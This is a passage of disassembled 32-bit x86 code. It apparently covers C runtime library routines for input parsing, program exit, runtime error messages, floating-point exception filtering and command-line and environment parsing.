  402229:	push   DWORD PTR [ebp-0x58]
  40222c:	push   DWORD PTR [ebp-0x5c]
  40222f:	call   0x403620
  402234:	mov    DWORD PTR [ebp-0x5c],eax
  402237:	mov    DWORD PTR [ebp-0x58],edx
  40223a:	jmp    0x402280
  40223c:	cmp    DWORD PTR ds:0x428278,0x1
  402243:	jle    0x402250
  402245:	push   esi
  402246:	push   ebx
  402247:	call   0x40312d
  40224c:	pop    ecx
  40224d:	pop    ecx
  40224e:	jmp    0x40225b
  402250:	mov    eax,ds:0x428270
  402255:	movzx  eax,BYTE PTR [eax+ebx*2]
  402259:	and    eax,esi
  40225b:	test   eax,eax
  40225d:	je     0x40227d
  40225f:	mov    eax,DWORD PTR [ebp-0x5c]
  402262:	mov    ecx,DWORD PTR [ebp-0x58]
  402265:	shld   ecx,eax,0x4
  402269:	shl    eax,0x4
  40226c:	mov    DWORD PTR [ebp-0x5c],eax
  40226f:	mov    DWORD PTR [ebp-0x58],ecx
  402272:	mov    eax,ebx
  402274:	call   0x40190b
  402279:	mov    ebx,eax
  40227b:	jmp    0x402280
  40227d:	inc    BYTE PTR [ebp-0x4c]
  402280:	cmp    BYTE PTR [ebp-0x4c],0x0
  402284:	jne    0x4022b3
  402286:	inc    DWORD PTR [ebp-0x40]
  402289:	lea    eax,[ebx-0x30]
  40228c:	cdq    
  40228d:	add    DWORD PTR [ebp-0x5c],eax
  402290:	adc    DWORD PTR [ebp-0x58],edx
  402293:	cmp    DWORD PTR [ebp-0x44],0x0
  402297:	je     0x4022a4
  402299:	dec    DWORD PTR [ebp-0x48]
  40229c:	jne    0x4022a4
  40229e:	mov    BYTE PTR [ebp-0x4c],0x1
  4022a2:	jmp    0x4022c6
  4022a4:	inc    DWORD PTR [ebp-0x30]
  4022a7:	mov    edx,DWORD PTR [ebp+0x8]
  4022aa:	call   0x40193d
  4022af:	mov    ebx,eax
  4022b1:	jmp    0x4022c6
  4022b3:	dec    DWORD PTR [ebp-0x30]
  4022b6:	cmp    ebx,0xffffffff
  4022b9:	je     0x4022c6
  4022bb:	push   DWORD PTR [ebp+0x8]
  4022be:	push   ebx
  4022bf:	call   0x403289
  4022c4:	pop    ecx
  4022c5:	pop    ecx
  4022c6:	cmp    BYTE PTR [ebp-0x4c],0x0
  4022ca:	je     0x4021d7
  4022d0:	mov    DWORD PTR [ebp-0x28],ebx
  4022d3:	cmp    BYTE PTR [ebp-0x4a],0x0
  4022d7:	je     0x4023e1
  4022dd:	mov    eax,DWORD PTR [ebp-0x5c]
  4022e0:	neg    eax
  4022e2:	mov    ecx,DWORD PTR [ebp-0x58]
  4022e5:	adc    ecx,0x0
  4022e8:	neg    ecx
  4022ea:	mov    DWORD PTR [ebp-0x5c],eax
  4022ed:	mov    DWORD PTR [ebp-0x58],ecx
  4022f0:	jmp    0x4023e1
  4022f5:	cmp    BYTE PTR [ebp-0x4c],0x0
  4022f9:	jne    0x4023d8
  4022ff:	mov    esi,0x80
  402304:	cmp    edi,0x78
  402307:	je     0x402350
  402309:	cmp    edi,0x70
  40230c:	je     0x402350
  40230e:	cmp    DWORD PTR ds:0x428278,0x1
  402315:	jle    0x402323
  402317:	push   0x4
  402319:	push   ebx
  40231a:	call   0x40312d
  40231f:	pop    ecx
  402320:	pop    ecx
  402321:	jmp    0x40232f
  402323:	mov    eax,ds:0x428270
  402328:	movzx  eax,BYTE PTR [eax+ebx*2]
  40232c:	and    eax,0x4
  40232f:	test   eax,eax
  402331:	je     0x402382
  402333:	cmp    edi,0x6f
  402336:	jne    0x402343
  402338:	cmp    ebx,0x38
  40233b:	jge    0x402382
  40233d:	shl    DWORD PTR [ebp-0x38],0x3
  402341:	jmp    0x402385
  402343:	mov    eax,DWORD PTR [ebp-0x38]
  402346:	lea    eax,[eax+eax*4]
  402349:	shl    eax,1
  40234b:	mov    DWORD PTR [ebp-0x38],eax
  40234e:	jmp    0x402385
  402350:	cmp    DWORD PTR ds:0x428278,0x1
  402357:	jle    0x402364
  402359:	push   esi
  40235a:	push   ebx
  40235b:	call   0x40312d
  402360:	pop    ecx
  402361:	pop    ecx
  402362:	jmp    0x40236f
  402364:	mov    eax,ds:0x428270
  402369:	movzx  eax,BYTE PTR [eax+ebx*2]
  40236d:	and    eax,esi
  40236f:	test   eax,eax
  402371:	je     0x402382
  402373:	shl    DWORD PTR [ebp-0x38],0x4
  402377:	mov    eax,ebx
  402379:	call   0x40190b
  40237e:	mov    ebx,eax
  402380:	jmp    0x402385
  402382:	inc    BYTE PTR [ebp-0x4c]
  402385:	cmp    BYTE PTR [ebp-0x4c],0x0
  402389:	jne    0x4023b8
  40238b:	inc    DWORD PTR [ebp-0x40]
  40238e:	mov    eax,DWORD PTR [ebp-0x38]
  402391:	lea    eax,[eax+ebx*1-0x30]
  402395:	mov    DWORD PTR [ebp-0x38],eax
  402398:	cmp    DWORD PTR [ebp-0x44],0x0
  40239c:	je     0x4023a9
  40239e:	dec    DWORD PTR [ebp-0x48]
  4023a1:	jne    0x4023a9
  4023a3:	mov    BYTE PTR [ebp-0x4c],0x1
  4023a7:	jmp    0x4023cb
  4023a9:	inc    DWORD PTR [ebp-0x30]
  4023ac:	mov    edx,DWORD PTR [ebp+0x8]
  4023af:	call   0x40193d
  4023b4:	mov    ebx,eax
  4023b6:	jmp    0x4023cb
  4023b8:	dec    DWORD PTR [ebp-0x30]
  4023bb:	cmp    ebx,0xffffffff
  4023be:	je     0x4023cb
  4023c0:	push   DWORD PTR [ebp+0x8]
  4023c3:	push   ebx
  4023c4:	call   0x403289
  4023c9:	pop    ecx
  4023ca:	pop    ecx
  4023cb:	cmp    BYTE PTR [ebp-0x4c],0x0
  4023cf:	je     0x402304
  4023d5:	mov    DWORD PTR [ebp-0x28],ebx
  4023d8:	cmp    BYTE PTR [ebp-0x4a],0x0
  4023dc:	je     0x4023e1
  4023de:	neg    DWORD PTR [ebp-0x38]
  4023e1:	cmp    edi,0x46
  4023e4:	jne    0x4023ea
  4023e6:	and    DWORD PTR [ebp-0x40],0x0
  4023ea:	cmp    DWORD PTR [ebp-0x40],0x0
  4023ee:	je     0x4024b2
  4023f4:	cmp    BYTE PTR [ebp-0x4b],0x0
  4023f8:	jne    0x402423
  4023fa:	inc    DWORD PTR [ebp-0x34]
  4023fd:	mov    ebx,DWORD PTR [ebp-0x64]
  402400:	mov    eax,DWORD PTR [ebp-0x38]
  402403:	cmp    DWORD PTR [ebp-0x54],0x0
  402407:	je     0x402416
  402409:	mov    eax,DWORD PTR [ebp-0x5c]
  40240c:	mov    DWORD PTR [ebx],eax
  40240e:	mov    eax,DWORD PTR [ebp-0x58]
  402411:	mov    DWORD PTR [ebx+0x4],eax
  402414:	jmp    0x402423
  402416:	cmp    BYTE PTR [ebp-0x4f],0x0
  40241a:	je     0x402420
  40241c:	mov    DWORD PTR [ebx],eax
  40241e:	jmp    0x402423
  402420:	mov    WORD PTR [ebx],ax
  402423:	inc    BYTE PTR [ebp-0x29]
  402426:	inc    DWORD PTR [ebp+0xc]
  402429:	mov    esi,DWORD PTR [ebp+0xc]
  40242c:	jmp    0x402496
  40242e:	inc    DWORD PTR [ebp-0x30]
  402431:	mov    edx,DWORD PTR [ebp+0x8]
  402434:	call   0x40193d
  402439:	mov    ebx,eax
  40243b:	mov    DWORD PTR [ebp-0x28],ebx
  40243e:	movzx  eax,BYTE PTR [esi]
  402441:	inc    esi
  402442:	mov    DWORD PTR [ebp+0xc],esi
  402445:	cmp    eax,ebx
  402447:	jne    0x40247f
  402449:	movzx  eax,bl
  40244c:	mov    ecx,DWORD PTR ds:0x428270
  402452:	test   BYTE PTR [ecx+eax*2+0x1],0x80
  402457:	je     0x402496
  402459:	inc    DWORD PTR [ebp-0x30]
  40245c:	mov    edx,DWORD PTR [ebp+0x8]
  40245f:	call   0x40193d
  402464:	movzx  ecx,BYTE PTR [esi]
  402467:	inc    esi
  402468:	mov    DWORD PTR [ebp+0xc],esi
  40246b:	cmp    ecx,eax
  40246d:	je     0x402493
  40246f:	cmp    eax,0xffffffff
  402472:	je     0x40247f
  402474:	push   DWORD PTR [ebp+0x8]
  402477:	push   eax
  402478:	call   0x403289
  40247d:	pop    ecx
  40247e:	pop    ecx
  40247f:	cmp    ebx,0xffffffff
  402482:	je     0x4024b2
  402484:	push   DWORD PTR [ebp+0x8]
  402487:	push   DWORD PTR [ebp-0x28]
  40248a:	call   0x403289
  40248f:	pop    ecx
  402490:	pop    ecx
  402491:	jmp    0x4024b2
  402493:	dec    DWORD PTR [ebp-0x30]
  402496:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  40249a:	jne    0x401984
  4024a0:	cmp    BYTE PTR [esi],0x25
  4024a3:	jne    0x4024b2
  4024a5:	mov    eax,DWORD PTR [ebp+0xc]
  4024a8:	cmp    BYTE PTR [eax+0x1],0x6e
  4024ac:	je     0x401981
  4024b2:	cmp    DWORD PTR [ebp-0x24],0x1
  4024b6:	jne    0x4024c1
  4024b8:	push   DWORD PTR [ebp-0x20]
  4024bb:	call   0x40331e
  4024c0:	pop    ecx
  4024c1:	mov    eax,DWORD PTR [ebp-0x34]
  4024c4:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4024c8:	jne    0x4024d6
  4024ca:	test   eax,eax
  4024cc:	jne    0x4024d6
  4024ce:	cmp    BYTE PTR [ebp-0x29],al
  4024d1:	jne    0x4024d6
  4024d3:	or     eax,0xffffffff
  4024d6:	lea    esp,[ebp-0x1e4]
  4024dc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024df:	xor    ecx,DWORD PTR [ebp+0x4]
  4024e2:	call   0x403606
  4024e7:	call   0x4030df
  4024ec:	ret    
  4024ed:	push   0x42615c
  4024f2:	call   DWORD PTR ds:0x42602c
  4024f8:	test   eax,eax
  4024fa:	je     0x402512
  4024fc:	push   0x42614c
  402501:	push   eax
  402502:	call   DWORD PTR ds:0x426014
  402508:	test   eax,eax
  40250a:	je     0x402512
  40250c:	push   DWORD PTR [esp+0x4]
  402510:	call   eax
  402512:	push   DWORD PTR [esp+0x4]
  402516:	call   DWORD PTR ds:0x426058
  40251c:	int3   
  40251d:	mov    eax,ds:0x429d30
  402522:	test   eax,eax
  402524:	je     0x402528
  402526:	call   eax
  402528:	push   esi
  402529:	push   edi
  40252a:	mov    ecx,0x42800c
  40252f:	mov    edi,0x42801c
  402534:	xor    eax,eax
  402536:	cmp    ecx,edi
  402538:	mov    esi,ecx
  40253a:	jae    0x402553
  40253c:	test   eax,eax
  40253e:	jne    0x40257f
  402540:	mov    ecx,DWORD PTR [esi]
  402542:	test   ecx,ecx
  402544:	je     0x402548
  402546:	call   ecx
  402548:	add    esi,0x4
  40254b:	cmp    esi,edi
  40254d:	jb     0x40253c
  40254f:	test   eax,eax
  402551:	jne    0x40257f
  402553:	push   0x402ff4
  402558:	call   0x4036d6
  40255d:	mov    esi,0x428000
  402562:	mov    eax,esi
  402564:	mov    edi,0x428008
  402569:	cmp    eax,edi
  40256b:	pop    ecx
  40256c:	jae    0x40257d
  40256e:	mov    eax,DWORD PTR [esi]
  402570:	test   eax,eax
  402572:	je     0x402576
  402574:	call   eax
  402576:	add    esi,0x4
  402579:	cmp    esi,edi
  40257b:	jb     0x40256e
  40257d:	xor    eax,eax
  40257f:	pop    edi
  402580:	pop    esi
  402581:	ret    
  402582:	push   ebp
  402583:	mov    ebp,esp
  402585:	push   esi
  402586:	xor    esi,esi
  402588:	inc    esi
  402589:	cmp    DWORD PTR ds:0x428818,esi
  40258f:	push   edi
  402590:	jne    0x4025a2
  402592:	push   DWORD PTR [ebp+0x8]
  402595:	call   DWORD PTR ds:0x426060
  40259b:	push   eax
  40259c:	call   DWORD PTR ds:0x42605c
  4025a2:	cmp    DWORD PTR [ebp+0xc],0x0
  4025a6:	mov    al,BYTE PTR [ebp+0x10]
  4025a9:	mov    DWORD PTR ds:0x428814,esi
  4025af:	mov    ds:0x428810,al
  4025b4:	jne    0x402608
  4025b6:	mov    ecx,DWORD PTR ds:0x429d28
  4025bc:	test   ecx,ecx
  4025be:	je     0x4025e9
  4025c0:	mov    eax,ds:0x429d24
  4025c5:	sub    eax,0x4
  4025c8:	cmp    eax,ecx
  4025ca:	jmp    0x4025e2
  4025cc:	mov    eax,DWORD PTR [eax]
  4025ce:	test   eax,eax
  4025d0:	je     0x4025d4
  4025d2:	call   eax
  4025d4:	mov    eax,ds:0x429d24
  4025d9:	sub    eax,0x4
  4025dc:	cmp    eax,DWORD PTR ds:0x429d28
  4025e2:	mov    ds:0x429d24,eax
  4025e7:	jae    0x4025cc
  4025e9:	mov    eax,0x428020
  4025ee:	mov    esi,0x428028
  4025f3:	cmp    eax,esi
  4025f5:	mov    edi,eax
  4025f7:	jae    0x402608
  4025f9:	mov    eax,DWORD PTR [edi]
  4025fb:	test   eax,eax
  4025fd:	je     0x402601
  4025ff:	call   eax
  402601:	add    edi,0x4
  402604:	cmp    edi,esi
  402606:	jb     0x4025f9
  402608:	mov    eax,0x42802c
  40260d:	mov    esi,0x428030
  402612:	cmp    eax,esi
  402614:	mov    edi,eax
  402616:	jae    0x402627
  402618:	mov    eax,DWORD PTR [edi]
  40261a:	test   eax,eax
  40261c:	je     0x402620
  40261e:	call   eax
  402620:	add    edi,0x4
  402623:	cmp    edi,esi
  402625:	jb     0x402618
  402627:	cmp    DWORD PTR [ebp+0x10],0x0
  40262b:	pop    edi
  40262c:	pop    esi
  40262d:	jne    0x402642
  40262f:	push   DWORD PTR [ebp+0x8]
  402632:	mov    DWORD PTR ds:0x428818,0x1
  40263c:	call   0x4024ed
  402641:	pop    ecx
  402642:	pop    ebp
  402643:	ret    
  402644:	push   0x0
  402646:	push   0x0
  402648:	push   DWORD PTR [esp+0xc]
  40264c:	call   0x402582
  402651:	add    esp,0xc
  402654:	ret    
  402655:	push   0x0
  402657:	push   0x1
  402659:	push   DWORD PTR [esp+0xc]
  40265d:	call   0x402582
  402662:	add    esp,0xc
  402665:	ret    
  402666:	push   0x1
  402668:	push   0x0
  40266a:	push   0x0
  40266c:	call   0x402582
  402671:	add    esp,0xc
  402674:	ret    
  402675:	push   0x1
  402677:	push   0x1
  402679:	push   0x0
  40267b:	call   0x402582
  402680:	add    esp,0xc
  402683:	ret    
  402684:	push   ebp
  402685:	mov    ebp,esp
  402687:	sub    esp,0x10c
  40268d:	mov    eax,ds:0x4282a8
  402692:	xor    eax,DWORD PTR [ebp+0x4]
  402695:	mov    ecx,DWORD PTR [ebp+0x8]
  402698:	push   ebx
  402699:	push   esi
  40269a:	mov    DWORD PTR [ebp-0x4],eax
  40269d:	xor    edx,edx
  40269f:	push   edi
  4026a0:	xor    eax,eax
  4026a2:	cmp    ecx,DWORD PTR [eax*8+0x428148]
  4026a9:	je     0x4026b1
  4026ab:	inc    eax
  4026ac:	cmp    eax,0x12
  4026af:	jb     0x4026a2
  4026b1:	mov    esi,eax
  4026b3:	shl    esi,0x3
  4026b6:	cmp    ecx,DWORD PTR [esi+0x428148]
  4026bc:	jne    0x4027e5
  4026c2:	mov    eax,ds:0x4287c8
  4026c7:	cmp    eax,0x1
  4026ca:	je     0x4027c0
  4026d0:	cmp    eax,edx
  4026d2:	jne    0x4026e1
  4026d4:	cmp    DWORD PTR ds:0x428144,0x1
  4026db:	je     0x4027c0
  4026e1:	cmp    ecx,0xfc
  4026e7:	je     0x4027e5
  4026ed:	push   0x104
  4026f2:	lea    eax,[ebp-0x10c]
  4026f8:	push   eax
  4026f9:	push   edx
  4026fa:	mov    BYTE PTR [ebp-0x8],dl
  4026fd:	call   DWORD PTR ds:0x42606c
  402703:	test   eax,eax
  402705:	jne    0x40271a
  402707:	lea    eax,[ebp-0x10c]
  40270d:	push   0x4264b4
  402712:	push   eax
  402713:	call   0x403810
  402718:	pop    ecx
  402719:	pop    ecx
  40271a:	lea    eax,[ebp-0x10c]
  402720:	push   eax
  402721:	lea    edi,[ebp-0x10c]
  402727:	call   0x403a40
  40272c:	inc    eax
  40272d:	cmp    eax,0x3c
  402730:	pop    ecx
  402731:	jbe    0x40275c
  402733:	lea    eax,[ebp-0x10c]
  402739:	push   eax
  40273a:	call   0x403a40
  40273f:	mov    edi,eax
  402741:	lea    eax,[ebp-0x10c]
  402747:	sub    eax,0x3b
  40274a:	push   0x3
  40274c:	add    edi,eax
  40274e:	push   0x4264b0
  402753:	push   edi
  402754:	call   0x403910
  402759:	add    esp,0x10
  40275c:	push   edi
  40275d:	call   0x403a40
  402762:	push   DWORD PTR [esi+0x42814c]
  402768:	mov    ebx,eax
  40276a:	call   0x403a40
  40276f:	lea    eax,[ebx+eax*1+0x1c]
  402773:	pop    ecx
  402774:	add    eax,0x3
  402777:	pop    ecx
  402778:	and    eax,0xfffffffc
  40277b:	call   0x4030f0
  402780:	mov    ebx,esp
  402782:	push   0x426494
  402787:	push   ebx
  402788:	call   0x403810
  40278d:	push   edi
  40278e:	push   ebx
  40278f:	call   0x403820
  402794:	push   0x426490
  402799:	push   ebx
  40279a:	call   0x403820
  40279f:	push   DWORD PTR [esi+0x42814c]
  4027a5:	push   ebx
  4027a6:	call   0x403820
  4027ab:	push   0x12010
  4027b0:	push   0x426468
  4027b5:	push   ebx
  4027b6:	call   0x403710
  4027bb:	add    esp,0x2c
  4027be:	jmp    0x4027e5
  4027c0:	push   edx
  4027c1:	lea    eax,[ebp+0x8]
  4027c4:	push   eax
  4027c5:	lea    esi,[esi+0x42814c]
  4027cb:	push   DWORD PTR [esi]
  4027cd:	call   0x403a40
  4027d2:	pop    ecx
  4027d3:	push   eax
  4027d4:	push   DWORD PTR [esi]
  4027d6:	push   0xfffffff4
  4027d8:	call   DWORD PTR ds:0x426068
  4027de:	push   eax
  4027df:	call   DWORD PTR ds:0x426064
  4027e5:	lea    esp,[ebp-0x118]
  4027eb:	mov    ecx,DWORD PTR [ebp-0x4]
  4027ee:	xor    ecx,DWORD PTR [ebp+0x4]
  4027f1:	call   0x403606
  4027f6:	pop    edi
  4027f7:	pop    esi
  4027f8:	pop    ebx
  4027f9:	leave  
  4027fa:	ret    
  4027fb:	mov    eax,ds:0x4287c8
  402800:	cmp    eax,0x1
  402803:	je     0x402812
  402805:	test   eax,eax
  402807:	jne    0x402833
  402809:	cmp    DWORD PTR ds:0x428144,0x1
  402810:	jne    0x402833
  402812:	push   0xfc
  402817:	call   0x402684
  40281c:	mov    eax,ds:0x42881c
  402821:	test   eax,eax
  402823:	pop    ecx
  402824:	je     0x402828
  402826:	call   eax
  402828:	push   0xff
  40282d:	call   0x402684
  402832:	pop    ecx
  402833:	ret    
  402834:	push   ebp
  402835:	mov    ebp,esp
  402837:	mov    edx,DWORD PTR [ebp+0x8]
  40283a:	mov    eax,ds:0x428258
  40283f:	push   ebx
  402840:	mov    ecx,0x4281d8
  402845:	push   esi
  402846:	cmp    DWORD PTR [ecx],edx
  402848:	je     0x40285b
  40284a:	lea    esi,[eax+eax*2]
  40284d:	add    ecx,0xc
  402850:	lea    esi,[esi*4+0x4281d8]
  402857:	cmp    ecx,esi
  402859:	jb     0x402846
  40285b:	lea    eax,[eax+eax*2]
  40285e:	lea    eax,[eax*4+0x4281d8]
  402865:	cmp    ecx,eax
  402867:	jae    0x40286d
  402869:	cmp    DWORD PTR [ecx],edx
  40286b:	je     0x40286f
  40286d:	xor    ecx,ecx
  40286f:	test   ecx,ecx
  402871:	je     0x402998
  402877:	mov    ebx,DWORD PTR [ecx+0x8]
  40287a:	test   ebx,ebx
  40287c:	je     0x402998
  402882:	cmp    ebx,0x5
  402885:	jne    0x402893
  402887:	and    DWORD PTR [ecx+0x8],0x0
  40288b:	xor    eax,eax
  40288d:	inc    eax
  40288e:	jmp    0x4029a1
  402893:	cmp    ebx,0x1
  402896:	je     0x402993
  40289c:	mov    eax,ds:0x428820
  4028a1:	mov    DWORD PTR [ebp+0x8],eax
  4028a4:	mov    eax,DWORD PTR [ebp+0xc]
  4028a7:	mov    ds:0x428820,eax
  4028ac:	mov    eax,DWORD PTR [ecx+0x4]
  4028af:	cmp    eax,0x8
  4028b2:	jne    0x402983
  4028b8:	mov    eax,ds:0x428250
  4028bd:	mov    edx,DWORD PTR ds:0x428254
  4028c3:	add    edx,eax
  4028c5:	cmp    eax,edx
  4028c7:	jge    0x4028de
  4028c9:	lea    esi,[eax+eax*2]
  4028cc:	lea    esi,[esi*4+0x4281e0]
  4028d3:	sub    edx,eax
  4028d5:	and    DWORD PTR [esi],0x0
  4028d8:	add    esi,0xc
  4028db:	dec    edx
  4028dc:	jne    0x4028d5
  4028de:	mov    ecx,DWORD PTR [ecx]
  4028e0:	cmp    ecx,0xc000008e
  4028e6:	mov    esi,DWORD PTR ds:0x42825c
  4028ec:	jne    0x4028fa
  4028ee:	mov    DWORD PTR ds:0x42825c,0x83
  4028f8:	jmp    0x402970
  4028fa:	cmp    ecx,0xc0000090
  402900:	jne    0x40290e
  402902:	mov    DWORD PTR ds:0x42825c,0x81
  40290c:	jmp    0x402970
  40290e:	cmp    ecx,0xc0000091
  402914:	jne    0x402922
  402916:	mov    DWORD PTR ds:0x42825c,0x84
  402920:	jmp    0x402970
  402922:	cmp    ecx,0xc0000093
  402928:	jne    0x402936
  40292a:	mov    DWORD PTR ds:0x42825c,0x85
  402934:	jmp    0x402970
  402936:	cmp    ecx,0xc000008d
  40293c:	jne    0x40294a
  40293e:	mov    DWORD PTR ds:0x42825c,0x82
  402948:	jmp    0x402970
  40294a:	cmp    ecx,0xc000008f
  402950:	jne    0x40295e
  402952:	mov    DWORD PTR ds:0x42825c,0x86
  40295c:	jmp    0x402970
  40295e:	cmp    ecx,0xc0000092
  402964:	jne    0x402970
  402966:	mov    DWORD PTR ds:0x42825c,0x8a
  402970:	push   DWORD PTR ds:0x42825c
  402976:	push   0x8
  402978:	call   ebx
  40297a:	pop    ecx
  40297b:	mov    DWORD PTR ds:0x42825c,esi
  402981:	jmp    0x40298a
  402983:	and    DWORD PTR [ecx+0x8],0x0
  402987:	push   eax
  402988:	call   ebx
  40298a:	mov    eax,DWORD PTR [ebp+0x8]
  40298d:	pop    ecx
  40298e:	mov    ds:0x428820,eax
  402993:	or     eax,0xffffffff
  402996:	jmp    0x4029a1
  402998:	push   DWORD PTR [ebp+0xc]
  40299b:	call   DWORD PTR ds:0x426070
  4029a1:	pop    esi
  4029a2:	pop    ebx
  4029a3:	pop    ebp
  4029a4:	ret    
  4029a5:	cmp    DWORD PTR ds:0x429d2c,0x0
  4029ac:	jne    0x4029b3
  4029ae:	call   0x403ee3
  4029b3:	push   esi
  4029b4:	mov    esi,DWORD PTR ds:0x429d34
  4029ba:	test   esi,esi
  4029bc:	jne    0x4029c5
  4029be:	mov    esi,0x4264cb
  4029c3:	jmp    0x402a0a
  4029c5:	mov    al,BYTE PTR [esi]
  4029c7:	cmp    al,0x22
  4029c9:	jne    0x4029f3
  4029cb:	inc    esi
  4029cc:	mov    al,BYTE PTR [esi]
  4029ce:	cmp    al,0x22
  4029d0:	je     0x402a03
  4029d2:	test   al,al
  4029d4:	je     0x4029ec
  4029d6:	movzx  eax,al
  4029d9:	push   eax
  4029da:	call   0x403afc
  4029df:	test   eax,eax
  4029e1:	pop    ecx
  4029e2:	je     0x4029e5
  4029e4:	inc    esi
  4029e5:	inc    esi
  4029e6:	mov    al,BYTE PTR [esi]
  4029e8:	cmp    al,0x22
  4029ea:	jne    0x4029d2
  4029ec:	cmp    BYTE PTR [esi],0x22
  4029ef:	jne    0x402a04
  4029f1:	jmp    0x402a03
  4029f3:	cmp    al,0x20
  4029f5:	jbe    0x402a04
  4029f7:	inc    esi
  4029f8:	cmp    BYTE PTR [esi],0x20
  4029fb:	ja     0x4029f7
  4029fd:	jmp    0x402a04
  4029ff:	cmp    al,0x20
  402a01:	ja     0x402a0a
  402a03:	inc    esi
  402a04:	mov    al,BYTE PTR [esi]
  402a06:	test   al,al
  402a08:	jne    0x4029ff
  402a0a:	mov    eax,esi
  402a0c:	pop    esi
  402a0d:	ret    
  402a0e:	push   ebx
  402a0f:	xor    ebx,ebx
  402a11:	cmp    DWORD PTR ds:0x429d2c,ebx
  402a17:	push   esi
  402a18:	push   edi
  402a19:	jne    0x402a20
  402a1b:	call   0x403ee3
  402a20:	mov    esi,DWORD PTR ds:0x4287c0
  402a26:	xor    edi,edi
  402a28:	cmp    esi,ebx
  402a2a:	jne    0x402a3e
  402a2c:	jmp    0x402a5e
  402a2e:	cmp    al,0x3d
  402a30:	je     0x402a33
  402a32:	inc    edi
  402a33:	push   esi
  402a34:	call   0x403a40
  402a39:	pop    ecx
  402a3a:	lea    esi,[esi+eax*1+0x1]
  402a3e:	mov    al,BYTE PTR [esi]
  402a40:	cmp    al,bl
  402a42:	jne    0x402a2e
  402a44:	lea    eax,[edi*4+0x4]
  402a4b:	push   eax
  402a4c:	call   0x4034f2
  402a51:	mov    edi,eax
  402a53:	cmp    edi,ebx
  402a55:	pop    ecx
  402a56:	mov    DWORD PTR ds:0x4287f8,edi
  402a5c:	jne    0x402a63
  402a5e:	or     eax,0xffffffff
  402a61:	jmp    0x402abb
  402a63:	mov    esi,DWORD PTR ds:0x4287c0
  402a69:	push   ebp
  402a6a:	jmp    0x402a96
  402a6c:	push   esi
  402a6d:	call   0x403a40
  402a72:	mov    ebp,eax
  402a74:	inc    ebp
  402a75:	cmp    BYTE PTR [esi],0x3d
  402a78:	pop    ecx
  402a79:	je     0x402a94
  402a7b:	push   ebp
  402a7c:	call   0x4034f2
  402a81:	cmp    eax,ebx
  402a83:	pop    ecx
  402a84:	mov    DWORD PTR [edi],eax
  402a86:	je     0x402abf
  402a88:	push   esi
  402a89:	push   eax
  402a8a:	call   0x403810
  402a8f:	pop    ecx
  402a90:	pop    ecx
  402a91:	add    edi,0x4
  402a94:	add    esi,ebp
  402a96:	cmp    BYTE PTR [esi],bl
  402a98:	jne    0x402a6c
  402a9a:	push   DWORD PTR ds:0x4287c0
  402aa0:	call   0x40331e
  402aa5:	mov    DWORD PTR ds:0x4287c0,ebx
  402aab:	mov    DWORD PTR [edi],ebx
  402aad:	mov    DWORD PTR ds:0x429d20,0x1
  402ab7:	xor    eax,eax
  402ab9:	pop    ecx
  402aba:	pop    ebp
  402abb:	pop    edi
  402abc:	pop    esi
  402abd:	pop    ebx
  402abe:	ret    
  402abf:	push   DWORD PTR ds:0x4287f8
  402ac5:	call   0x40331e
  402aca:	mov    DWORD PTR ds:0x4287f8,ebx
  402ad0:	or     eax,0xffffffff
  402ad3:	jmp    0x402ab9
  402ad5:	push   ebp
  402ad6:	mov    ebp,esp
  402ad8:	push   ecx
  402ad9:	push   ebx
  402ada:	mov    ebx,DWORD PTR [ebp+0xc]
  402add:	xor    edx,edx
  402adf:	cmp    DWORD PTR [ebp+0x8],edx
  402ae2:	push   edi
  402ae3:	mov    DWORD PTR [esi],edx
  402ae5:	mov    edi,ecx
  402ae7:	mov    DWORD PTR [ebx],0x1
  402aed:	je     0x402af8
  402aef:	mov    ecx,DWORD PTR [ebp+0x8]
  402af2:	add    DWORD PTR [ebp+0x8],0x4
  402af6:	mov    DWORD PTR [ecx],edi
  402af8:	cmp    BYTE PTR [eax],0x22
  402afb:	jne    0x402b0b
  402afd:	xor    ecx,ecx
  402aff:	test   edx,edx
  402b01:	sete   cl
  402b04:	inc    eax
  402b05:	mov    edx,ecx
  402b07:	mov    cl,0x22
  402b09:	jmp    0x402b38
  402b0b:	inc    DWORD PTR [esi]
  402b0d:	test   edi,edi
  402b0f:	je     0x402b16
  402b11:	mov    cl,BYTE PTR [eax]
  402b13:	mov    BYTE PTR [edi],cl
  402b15:	inc    edi
  402b16:	mov    cl,BYTE PTR [eax]
  402b18:	movzx  ebx,cl
  402b1b:	inc    eax
  402b1c:	test   BYTE PTR [ebx+0x4299e1],0x4
  402b23:	je     0x402b31
  402b25:	inc    DWORD PTR [esi]
  402b27:	test   edi,edi
  402b29:	je     0x402b30
  402b2b:	mov    bl,BYTE PTR [eax]
  402b2d:	mov    BYTE PTR [edi],bl
  402b2f:	inc    edi
  402b30:	inc    eax
  402b31:	test   cl,cl
  402b33:	mov    ebx,DWORD PTR [ebp+0xc]
  402b36:	je     0x402b6a
  402b38:	test   edx,edx
  402b3a:	jne    0x402af8
  402b3c:	cmp    cl,0x20
  402b3f:	je     0x402b46
  402b41:	cmp    cl,0x9
  402b44:	jne    0x402af8
  402b46:	test   edi,edi
  402b48:	je     0x402b4e
  402b4a:	and    BYTE PTR [edi-0x1],0x0
  402b4e:	and    DWORD PTR [ebp-0x4],0x0
  402b52:	cmp    BYTE PTR [eax],0x0
  402b55:	je     0x402c31
  402b5b:	mov    cl,BYTE PTR [eax]
  402b5d:	cmp    cl,0x20
  402b60:	je     0x402b67
  402b62:	cmp    cl,0x9
  402b65:	jne    0x402b6d
  402b67:	inc    eax
  402b68:	jmp    0x402b5b
  402b6a:	dec    eax
  402b6b:	jmp    0x402b4e
  402b6d:	cmp    BYTE PTR [eax],0x0
  402b70:	je     0x402c31
  402b76:	cmp    DWORD PTR [ebp+0x8],0x0
  402b7a:	je     0x402b85
  402b7c:	mov    ecx,DWORD PTR [ebp+0x8]
  402b7f:	add    DWORD PTR [ebp+0x8],0x4
  402b83:	mov    DWORD PTR [ecx],edi
  402b85:	inc    DWORD PTR [ebx]
  402b87:	xor    ebx,ebx
  402b89:	inc    ebx
  402b8a:	xor    edx,edx
  402b8c:	jmp    0x402b90
  402b8e:	inc    eax
  402b8f:	inc    edx
  402b90:	cmp    BYTE PTR [eax],0x5c
  402b93:	je     0x402b8e
  402b95:	cmp    BYTE PTR [eax],0x22
  402b98:	jne    0x402bc0
  402b9a:	test   dl,0x1
  402b9d:	jne    0x402bbe
  402b9f:	cmp    DWORD PTR [ebp-0x4],0x0
  402ba3:	je     0x402bb1
